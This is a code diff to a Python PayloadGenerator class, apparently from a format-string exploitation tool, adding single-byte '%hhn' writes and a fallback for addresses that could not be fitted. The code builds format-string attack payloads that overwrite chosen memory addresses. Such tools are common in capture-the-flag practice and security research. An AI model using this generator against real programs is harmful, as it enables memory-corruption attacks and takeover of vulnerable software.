@@ -132,10 +132,11 @@ class PayloadGenerator:
                     raise ValueError("Unknown error. Missing bytes")
                 continue
             else:
-                if addr_index > 0:
+                if addr_index > 0 and self.addrs[addr_index - 1] > self.addrs[addr_index] - 1:
                     addr_index -= 1  # can't fit one byte, backstepping
                 else:
-                    raise ValueError("Can't fit words. (Probably single 1-byte set?).")
+                    self.tuples.append( (addr, 1, self.mem[addr]) )
+                    addr_index += 1
 
         self.tuples.sort(key=operator.itemgetter(2))
         return
@@ -173,7 +174,12 @@ class PayloadGenerator:
                     warning("Can't write a value %08x (too small)." % value)
                     continue
 
-                payload += "%" + str(index) + "$" + ("h" if size == 2 else "") + "n"
+                modi = {
+                        1: "hh",
+                        2: "h",
+                        4: ""
+                }[size]
+                payload += "%" + str(index) + "$" + modi + "n"
                 addrs += struct.pack("<I", addr)
                 printed += print_len
                 index += 1
